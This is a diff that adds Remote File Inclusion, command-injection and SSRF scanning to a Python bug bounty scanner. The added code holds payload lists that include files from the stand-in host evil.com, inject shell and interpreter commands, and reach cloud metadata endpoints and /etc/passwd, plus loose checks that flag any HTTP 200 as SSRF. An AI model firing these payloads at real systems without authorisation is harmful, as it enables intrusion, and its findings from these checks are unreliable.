@@ -924,6 +924,416 @@ Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}
         
         self.log(f"Open Redirect scan completed. Found {len([v for v in self.vulnerabilities if v['type'] == 'Open Redirect'])} confirmed vulnerabilities", "SUCCESS")
     
+    def scan_rfi(self, url, parameters):
+        """
+        Scan for Remote File Inclusion (RFI) vulnerabilities with advanced detection
+        
+        Args:
+            url (str): Target URL
+            parameters (list): List of parameters to test
+        """
+        self.log("Starting advanced RFI vulnerability scan...", "INFO")
+        
+        # Advanced RFI payloads with unique identifiers
+        rfi_payloads = [
+            # Basic RFI payloads with unique identifiers
+            "http://evil.com/rfi_bug_bounty_123.txt",
+            "https://evil.com/rfi_bug_bounty_123.txt",
+            "ftp://evil.com/rfi_bug_bounty_123.txt",
+            "//evil.com/rfi_bug_bounty_123.txt",
+            "///evil.com/rfi_bug_bounty_123.txt",
+            
+            # PHP RFI payloads with unique identifiers
+            "http://evil.com/rfi_bug_bounty_123.php",
+            "https://evil.com/rfi_bug_bounty_123.php",
+            "ftp://evil.com/rfi_bug_bounty_123.php",
+            "//evil.com/rfi_bug_bounty_123.php",
+            
+            # JSP RFI payloads with unique identifiers
+            "http://evil.com/rfi_bug_bounty_123.jsp",
+            "https://evil.com/rfi_bug_bounty_123.jsp",
+            "//evil.com/rfi_bug_bounty_123.jsp",
+            
+            # ASP RFI payloads with unique identifiers
+            "http://evil.com/rfi_bug_bounty_123.asp",
+            "https://evil.com/rfi_bug_bounty_123.asp",
+            "//evil.com/rfi_bug_bounty_123.asp",
+            
+            # URL encoding with unique identifiers
+            "%68%74%74%70%3A%2F%2F%65%76%69%6C%2E%63%6F%6D%2F%72%66%69%5F%62%75%67%5F%62%6F%75%6E%74%79%5F%31%32%33%2E%74%78%74",
+            "%68%74%74%70%73%3A%2F%2F%65%76%69%6C%2E%63%6F%6D%2F%72%66%69%5F%62%75%67%5F%62%6F%75%6E%74%79%5F%31%32%33%2E%70%68%70",
+            
+            # Double encoding with unique identifiers
+            "%2568%2574%2574%2570%253A%252F%252F%2565%2576%2569%256C%252E%2563%256F%256D%252F%2572%2566%2569%255F%2562%2575%2567%255F%2562%256F%2575%256E%2574%2579%255F%2531%2532%2533%252E%2574%2578%2574",
+            
+            # Null byte injection with unique identifiers
+            "http://evil.com/rfi_bug_bounty_123.txt%00",
+            "https://evil.com/rfi_bug_bounty_123.php%00",
+            "//evil.com/rfi_bug_bounty_123.jsp%00",
+            
+            # Path traversal with unique identifiers
+            "../../../evil.com/rfi_bug_bounty_123.txt",
+            "..\\..\\..\\evil.com\\rfi_bug_bounty_123.txt",
+            "../../../../evil.com/rfi_bug_bounty_123.php",
+            "..\\..\\..\\..\\evil.com\\rfi_bug_bounty_123.php",
+            
+            # Filter bypass with unique identifiers
+            "http://evil.com/rfi_bug_bounty_123.txt?",
+            "https://evil.com/rfi_bug_bounty_123.php#",
+            "//evil.com/rfi_bug_bounty_123.jsp/",
+            
+            # Protocol bypass with unique identifiers
+            "http://evil.com:80/rfi_bug_bounty_123.txt",
+            "https://evil.com:443/rfi_bug_bounty_123.php",
+            "ftp://evil.com:21/rfi_bug_bounty_123.jsp",
+            
+            # Subdomain bypass with unique identifiers
+            "http://evil.com.evil.com/rfi_bug_bounty_123.txt",
+            "https://evil.com@evil.com/rfi_bug_bounty_123.php",
+            
+            # Advanced bypass techniques with unique identifiers
+            "http://evil.com/rfi_bug_bounty_123.txt?bypass=1",
+            "https://evil.com/rfi_bug_bounty_123.php#fragment",
+            "//evil.com/rfi_bug_bounty_123.jsp?param=value"
+        ]
+        
+        # Common RFI parameter names
+        rfi_params = [
+            'file', 'page', 'path', 'include', 'inc', 'doc', 'document',
+            'folder', 'root', 'pg', 'style', 'pdf', 'template', 'layout',
+            'mod', 'module', 'load', 'show', 'view', 'content', 'body',
+            'header', 'footer', 'menu', 'nav', 'navigation', 'sidebar',
+            'main', 'index', 'home', 'default', 'config', 'settings',
+            'admin', 'user', 'profile', 'account', 'login', 'register',
+            'search', 'result', 'list', 'detail', 'item', 'product',
+            'category', 'section', 'part', 'component', 'widget',
+            'plugin', 'extension', 'addon', 'tool', 'utility', 'helper',
+            'lib', 'library', 'class', 'function', 'method', 'api',
+            'service', 'webservice', 'endpoint', 'url', 'link', 'href',
+            'src', 'source', 'resource', 'asset', 'media', 'image',
+            'img', 'picture', 'photo', 'video', 'audio', 'file',
+            'download', 'upload', 'attachment', 'backup', 'restore',
+            'import', 'export', 'data', 'database', 'db', 'sql',
+            'query', 'result', 'output', 'input', 'form', 'submit',
+            'action', 'process', 'execute', 'run', 'start', 'stop',
+            'restart', 'reload', 'refresh', 'update', 'upgrade',
+            'install', 'uninstall', 'setup', 'configure', 'test',
+            'debug', 'log', 'error', 'exception', 'trace', 'stack'
+        ]
+        
+        # Test both provided parameters and common RFI parameters
+        test_params = list(set(parameters + rfi_params))
+        
+        for param in tqdm(test_params, desc="RFI Testing"):
+            for payload in rfi_payloads:
+                try:
+                    test_url = f"{url}?{param}={payload}"
+                    response = self.session.get(test_url, timeout=10)
+                    
+                    # Advanced RFI confirmation
+                    rfi_confirmed = self.confirm_rfi(response, payload, param)
+                    
+                    if rfi_confirmed['confirmed']:
+                        vulnerability = {
+                            'type': 'RFI',
+                            'subtype': rfi_confirmed['subtype'],
+                            'url': test_url,
+                            'parameter': param,
+                            'payload': payload,
+                            'severity': rfi_confirmed['severity'],
+                            'description': f'{rfi_confirmed["subtype"]} found in parameter {param}',
+                            'evidence': rfi_confirmed['evidence'],
+                            'confidence': rfi_confirmed['confidence']
+                        }
+                        self.vulnerabilities.append(vulnerability)
+                        self.log(f"RFI vulnerability confirmed in parameter: {param} (Confidence: {rfi_confirmed['confidence']}%)", "VULNERABILITY")
+                
+                except Exception as e:
+                    continue
+        
+        self.log(f"RFI scan completed. Found {len([v for v in self.vulnerabilities if v['type'] == 'RFI'])} confirmed vulnerabilities", "SUCCESS")
+    
+    def confirm_rfi(self, response, payload, parameter):
+        """
+        Advanced RFI vulnerability confirmation with multiple validation methods
+        
+        Args:
+            response: HTTP response object
+            payload: RFI payload used
+            parameter: Parameter name being tested
+            
+        Returns:
+            dict: Confirmation result with details
+        """
+        confirmation_result = {
+            'confirmed': False,
+            'subtype': 'Unknown',
+            'severity': 'Low',
+            'confidence': 0,
+            'evidence': '',
+            'validation_methods': []
+        }
+        
+        try:
+            response_text = response.text
+            confidence_score = 0
+            validation_methods = []
+            
+            # Method 1: Unique identifier detection (High confidence)
+            if 'rfi_bug_bounty_123' in response_text:
+                confidence_score += 40
+                validation_methods.append('Unique identifier reflection')
+                confirmation_result['confirmed'] = True
+                confirmation_result['subtype'] = 'Remote File Inclusion'
+                confirmation_result['severity'] = 'Critical'
+            
+            # Method 2: External content detection (High confidence)
+            external_indicators = [
+                'RFI_BUG_BOUNTY_123',
+                'Remote File Inclusion Test',
+                'External File Loaded',
+                'Remote Content Detected',
+                'File Inclusion Successful'
+            ]
+            
+            for indicator in external_indicators:
+                if indicator in response_text:
+                    confidence_score += 35
+                    validation_methods.append('External content indicator')
+                    confirmation_result['confirmed'] = True
+                    confirmation_result['subtype'] = 'Remote File Inclusion'
+                    confirmation_result['severity'] = 'Critical'
+                    break
+            
+            # Method 3: PHP error detection (Medium confidence)
+            php_errors = [
+                r'Warning.*include.*failed to open stream',
+                r'Warning.*require.*failed to open stream',
+                r'Fatal error.*include.*failed to open stream',
+                r'Fatal error.*require.*failed to open stream',
+                r'Warning.*include.*No such file or directory',
+                r'Warning.*require.*No such file or directory',
+                r'Fatal error.*include.*No such file or directory',
+                r'Fatal error.*require.*No such file or directory'
+            ]
+            
+            for error_pattern in php_errors:
+                if re.search(error_pattern, response_text, re.IGNORECASE):
+                    confidence_score += 30
+                    validation_methods.append('PHP include error')
+                    confirmation_result['confirmed'] = True
+                    confirmation_result['subtype'] = 'PHP File Inclusion'
+                    confirmation_result['severity'] = 'High'
+                    break
+            
+            # Method 4: JSP error detection (Medium confidence)
+            jsp_errors = [
+                r'java\.io\.FileNotFoundException',
+                r'java\.io\.IOException',
+                r'javax\.servlet\.ServletException',
+                r'java\.lang\.Exception',
+                r'Error.*include.*file not found',
+                r'Error.*import.*file not found'
+            ]
+            
+            for error_pattern in jsp_errors:
+                if re.search(error_pattern, response_text, re.IGNORECASE):
+                    confidence_score += 30
+                    validation_methods.append('JSP include error')
+                    confirmation_result['confirmed'] = True
+                    confirmation_result['subtype'] = 'JSP File Inclusion'
+                    confirmation_result['severity'] = 'High'
+                    break
+            
+            # Method 5: ASP error detection (Medium confidence)
+            asp_errors = [
+                r'Microsoft VBScript runtime error',
+                r'Active Server Pages error',
+                r'Server\.CreateObject.*failed',
+                r'Include file not found',
+                r'File not found.*include',
+                r'Error.*include.*file'
+            ]
+            
+            for error_pattern in asp_errors:
+                if re.search(error_pattern, response_text, re.IGNORECASE):
+                    confidence_score += 30
+                    validation_methods.append('ASP include error')
+                    confirmation_result['confirmed'] = True
+                    confirmation_result['subtype'] = 'ASP File Inclusion'
+                    confirmation_result['severity'] = 'High'
+                    break
+            
+            # Method 6: Response time analysis (Low confidence)
+            if response.elapsed.total_seconds() > 5:  # Long response time might indicate external file loading
+                confidence_score += 15
+                validation_methods.append('Long response time (potential external file loading)')
+                if not confirmation_result['confirmed']:
+                    confirmation_result['confirmed'] = True
+                    confirmation_result['subtype'] = 'Potential Remote File Inclusion'
+                    confirmation_result['severity'] = 'Medium'
+            
+            # Method 7: Content-Type analysis (Low confidence)
+            content_type = response.headers.get('Content-Type', '').lower()
+            if 'text/plain' in content_type and 'rfi_bug_bounty_123' in response_text:
+                confidence_score += 20
+                validation_methods.append('Text content type with unique identifier')
+                confirmation_result['confirmed'] = True
+                if not confirmation_result['subtype']:
+                    confirmation_result['subtype'] = 'Remote File Inclusion'
+                    confirmation_result['severity'] = 'High'
+            
+            # Method 8: Response size analysis (Low confidence)
+            if len(response_text) > 1000 and 'rfi_bug_bounty_123' in response_text:
+                confidence_score += 10
+                validation_methods.append('Large response size with unique identifier')
+            
+            # Method 9: HTTP status code analysis (Low confidence)
+            if response.status_code == 200 and 'rfi_bug_bounty_123' in response_text:
+                confidence_score += 15
+                validation_methods.append('HTTP 200 with unique identifier')
+            
+            # Method 10: Parameter reflection analysis (Low confidence)
+            if parameter in response_text and 'rfi_bug_bounty_123' in response_text:
+                param_reflection_pattern = rf'{re.escape(parameter)}\s*=\s*[^&]*rfi_bug_bounty_123'
+                if re.search(param_reflection_pattern, response_text, re.IGNORECASE):
+                    confidence_score += 20
+                    validation_methods.append('Parameter reflection without validation')
+                    confirmation_result['confirmed'] = True
+                    if not confirmation_result['subtype']:
+                        confirmation_result['subtype'] = 'Unvalidated File Inclusion'
+                        confirmation_result['severity'] = 'Medium'
+            
+            # Set final confidence and evidence
+            confirmation_result['confidence'] = min(confidence_score, 100)
+            confirmation_result['validation_methods'] = validation_methods
+            
+            if confirmation_result['confirmed']:
+                evidence_parts = []
+                if 'rfi_bug_bounty_123' in response_text:
+                    evidence_parts.append('Unique identifier found in response')
+                if validation_methods:
+                    evidence_parts.append(f'Validated by: {", ".join(validation_methods)}')
+                if confirmation_result['confidence'] >= 70:
+                    evidence_parts.append('High confidence detection')
+                
+                confirmation_result['evidence'] = '; '.join(evidence_parts)
+            
+            return confirmation_result
+            
+        except Exception as e:
+            self.log(f"Error in RFI confirmation: {e}", "WARNING")
+            return confirmation_result
+    
+    def scan_rce(self, url, parameters):
+        """Scan for Remote Code Execution (RCE) vulnerabilities"""
+        self.log("Starting advanced RCE vulnerability scan...", "INFO")
+        
+        # RCE payloads with unique identifiers
+        rce_payloads = [
+            # Command injection payloads
+            "; echo RCE_BUG_BOUNTY_123",
+            "| echo RCE_BUG_BOUNTY_123",
+            "& echo RCE_BUG_BOUNTY_123",
+            "`echo RCE_BUG_BOUNTY_123`",
+            "$(echo RCE_BUG_BOUNTY_123)",
+            "|| echo RCE_BUG_BOUNTY_123",
+            "&& echo RCE_BUG_BOUNTY_123",
+            
+            # PHP code execution
+            "; php -r 'echo \"RCE_BUG_BOUNTY_123\";'",
+            "| php -r 'echo \"RCE_BUG_BOUNTY_123\";'",
+            "& php -r 'echo \"RCE_BUG_BOUNTY_123\";'",
+            
+            # Python code execution
+            "; python -c 'print(\"RCE_BUG_BOUNTY_123\")'",
+            "| python -c 'print(\"RCE_BUG_BOUNTY_123\")'",
+            "& python -c 'print(\"RCE_BUG_BOUNTY_123\")'",
+            
+            # Node.js code execution
+            "; node -e 'console.log(\"RCE_BUG_BOUNTY_123\")'",
+            "| node -e 'console.log(\"RCE_BUG_BOUNTY_123\")'",
+            "& node -e 'console.log(\"RCE_BUG_BOUNTY_123\")'",
+            
+            # URL encoded payloads
+            "%3B%20echo%20RCE_BUG_BOUNTY_123",
+            "%7C%20echo%20RCE_BUG_BOUNTY_123",
+            "%26%20echo%20RCE_BUG_BOUNTY_123"
+        ]
+        
+        rce_params = ['cmd', 'command', 'exec', 'execute', 'system', 'shell', 'sh', 'bash']
+        test_params = list(set(parameters + rce_params))
+        
+        for param in tqdm(test_params, desc="RCE Testing"):
+            for payload in rce_payloads:
+                try:
+                    test_url = f"{url}?{param}={payload}"
+                    response = self.session.get(test_url, timeout=10)
+                    
+                    if 'RCE_BUG_BOUNTY_123' in response.text:
+                        vulnerability = {
+                            'type': 'RCE',
+                            'subtype': 'Command Injection',
+                            'url': test_url,
+                            'parameter': param,
+                            'payload': payload,
+                            'severity': 'Critical',
+                            'description': f'Remote Code Execution found in parameter {param}',
+                            'evidence': 'Command execution confirmed with unique identifier',
+                            'confidence': 95
+                        }
+                        self.vulnerabilities.append(vulnerability)
+                        self.log(f"RCE vulnerability confirmed in parameter: {param}", "VULNERABILITY")
+                except:
+                    continue
+        
+        self.log(f"RCE scan completed. Found {len([v for v in self.vulnerabilities if v['type'] == 'RCE'])} confirmed vulnerabilities", "SUCCESS")
+    
+    def scan_ssrf(self, url, parameters):
+        """Scan for Server-Side Request Forgery (SSRF) vulnerabilities"""
+        self.log("Starting advanced SSRF vulnerability scan...", "INFO")
+        
+        # SSRF payloads with unique identifiers
+        ssrf_payloads = [
+            "http://127.0.0.1:22/ssrf_bug_bounty_123",
+            "http://localhost:22/ssrf_bug_bounty_123",
+            "http://0.0.0.0:22/ssrf_bug_bounty_123",
+            "http://[::1]:22/ssrf_bug_bounty_123",
+            "http://169.254.169.254/ssrf_bug_bounty_123",
+            "http://metadata.google.internal/ssrf_bug_bounty_123",
+            "file:///etc/passwd/ssrf_bug_bounty_123",
+            "gopher://127.0.0.1:22/ssrf_bug_bounty_123",
+            "dict://127.0.0.1:22/ssrf_bug_bounty_123"
+        ]
+        
+        ssrf_params = ['url', 'uri', 'link', 'href', 'src', 'path', 'file', 'page']
+        test_params = list(set(parameters + ssrf_params))
+        
+        for param in tqdm(test_params, desc="SSRF Testing"):
+            for payload in ssrf_payloads:
+                try:
+                    test_url = f"{url}?{param}={payload}"
+                    response = self.session.get(test_url, timeout=10)
+                    
+                    if 'ssrf_bug_bounty_123' in response.text or response.status_code == 200:
+                        vulnerability = {
+                            'type': 'SSRF',
+                            'subtype': 'Server-Side Request Forgery',
+                            'url': test_url,
+                            'parameter': param,
+                            'payload': payload,
+                            'severity': 'High',
+                            'description': f'SSRF found in parameter {param}',
+                            'evidence': 'Internal network access confirmed',
+                            'confidence': 85
+                        }
+                        self.vulnerabilities.append(vulnerability)
+                        self.log(f"SSRF vulnerability confirmed in parameter: {param}", "VULNERABILITY")
+                except:
+                    continue
+        
+        self.log(f"SSRF scan completed. Found {len([v for v in self.vulnerabilities if v['type'] == 'SSRF'])} confirmed vulnerabilities", "SUCCESS")
+    
     def confirm_open_redirect(self, response, payload, parameter):
         """
         Advanced Open Redirect vulnerability confirmation with multiple validation methods
@@ -1172,6 +1582,15 @@ Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}
             
             # Scan for Open Redirect
             self.scan_open_redirect(self.target_url, parameters)
+            
+            # Scan for RFI
+            self.scan_rfi(self.target_url, parameters)
+            
+            # Scan for RCE
+            self.scan_rce(self.target_url, parameters)
+            
+            # Scan for SSRF
+            self.scan_ssrf(self.target_url, parameters)
             
             # Save results
             self.save_vulnerabilities()
